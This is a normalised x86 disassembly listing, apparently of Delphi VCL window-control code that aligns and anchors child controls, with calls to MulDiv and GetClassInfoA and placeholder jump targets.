cmp [ edi + 0x30 ] 0x0
je r-xdata
mov [ edi + 0x1a8 ] 0x0
xor edx edx
mov eax edi
call sub_43821c
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov dl 0x1
mov eax edi
call sub_43d848
mov eax edi
call sub_43da88
test eax eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0xac ]
mov eax [ edi + 0x170 ]
call sub_403198
mov eax [ edi + 0x18c ]
test eax eax
je r-xdata
mov edx eax
dec edx
mov eax edi
call sub_43da4c
mov esi eax
mov edx esi
mov eax edi
call sub_43d8b4
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax edi
call sub_43da88
test eax eax
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_439748
test bl bl
jle r-xdata
call sub_41ab78
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40350c
sub_43cc78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x19c ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_43cd3c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_414238
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_440f18
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_414098
mov edx [ eax + 0x1a0 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41418c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_414098
test eax eax
je r-xdata
sub_43cd4c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor eax eax
push ebp
push sub_43cd8c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4399ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43cd93
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
sub_43cd93
mov eax [ ebp - 0x4 ]
call sub_43cc78
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43e44c
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_43b724
sub_43cdc8
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
xor ebx ebx
mov bl [ ebp - 0x1 ]
cmp ebx 0x6
ja r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
jmp [ ebx * 4 + jump_table_43cde3 ]
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setle cl
jmp r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setle cl
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
xchg ecx eax
xchg ecx edx
mov ebx [ eax ]
call [ ebx + 0xa4 ]
mov ecx eax
sub_43ce54
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x90 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp - 0x5 ]
mov al [ eax + rw-data ]
mov edx [ ebp - 0x4 ]
cmp al [ edx + 0x61 ]
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x94 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44105c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0x14 ] eax
mov al [ ebp - 0x5 ]
add al 0xfd
sub al 0x2
jb r-xdata
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x30 ]
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_412bb8
lea edx [ ebp - 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x34 ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x18 ] eax
mov al [ ebp - 0x5 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43d1d5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d1dc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
jmp [ eax * 4 + jump_table_43d0ea ]
sub al 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x18 ] eax
cmp [ ebp - 0x18 ] 0x0
jl r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x88 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x88 ]
mov edx [ ebp - 0x20 ]
sub edx eax
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
add [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x14 ]
sub [ eax + 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xa8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x5 ]
cmp eax 0x6
ja r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x1
xor eax eax
push ebp
push sub_43d04d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x62 ] 0x0
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8c ]
push eax
call MulDiv
mov edx [ ebp - 0x18 ]
sar edx 0x1
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x10 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x94 ]
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x8c ]
mov edx [ ebp - 0x1c ]
sub edx eax
mov [ ebp - 0x18 ] edx
jmp r-xdata
sub eax edx
mov [ ebp - 0x10 ] eax
adc edx 0x0
sub_43d1dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
xor edx edx
mov dl [ ebp - 0x5 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
cmp edx [ ebp - 0x18 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_43d20b ]
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax + 0x4 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub [ eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0x8 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x18 ]
sub edx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add [ eax + 0xc ] edx
sub_43d294
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43da88
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_413eec
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_414098
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_43ce54
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_43da4c
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
xor esi esi
jmp r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_414114
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_414098
mov edx eax
mov ecx ebx
mov eax edi
call sub_43cdc8
pop ecx
test al al
je r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
inc esi
sub_43d404
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_43da88
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_43da4c
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_43da4c
mov dl [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_43d458
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a8 ] 0x0
je r-xdata
push ebp
call sub_43d404
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d537
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_43d294
pop ecx
push ebp
mov al 0x2
call sub_43d294
pop ecx
push ebp
mov al 0x3
call sub_43d294
pop ecx
push ebp
mov al 0x4
call sub_43d294
pop ecx
push ebp
mov al 0x5
call sub_43d294
pop ecx
push ebp
mov al 0x6
call sub_43d294
pop ecx
push ebp
xor eax eax
call sub_43d294
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc7
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_403394
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_43d55c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44105c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x160 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor eax eax
push ebp
push sub_43d5e3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_43d620
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_43d6e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_439f74
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_43da88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d6ec
mov eax [ ebp - 0xc ]
call sub_403198
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413eec
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_439ce0
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_414098
xor ecx ecx
mov edx 0xb03e
call sub_43b724
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_43d6f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43da88
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor edx edx
push ebp
push sub_43d7db
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_43da88
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc0
call sub_403394
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
test ebx ebx
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov edx eax
mov eax [ ebp - 0xc ]
call sub_413eec
mov edx ebx
dec edx
mov eax [ ebp - 0xc ]
call sub_414098
cmp [ eax + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_403198
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
call sub_439a84
mov dl 0x4
call sub_439a84
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_413f38
sub_43d848
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_451710
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_455434
sub_43d868
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_438e64
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_438e64
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_438e64
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_43d8b4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_438e8c
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_438e8c
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_438e8c
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_43d8fc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403394
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_43b724
mov edx ebx
mov eax edi
call sub_43d868
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_43b724
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_43b724
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_43b724
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax edi
call sub_44105c
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_43b724
mov eax edi
call sub_43e44c
jmp r-xdata
mov edx ebx
mov eax edi
call sub_43d55c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43d9d0
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_43b724
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax esi
call sub_44105c
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_43d848
mov eax ebp
call sub_43e2b0
jmp r-xdata
mov edx ebx
mov eax esi
call sub_43d8b4
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_43b724
mov eax esi
call sub_43d618
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_43a9b8
sub_43da4c
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_414098
mov edx edi
mov eax ebp
call sub_414098
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_43daa8
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_43da88
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_43da4c
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_43dae8
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_43daa8
add esp 0x10
retn
sub_43db10
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_43db7c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_43abb4
test al al
je r-xdata
mov eax ebx
call sub_43abe4
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403394
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403394
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403394
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43dbe4
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
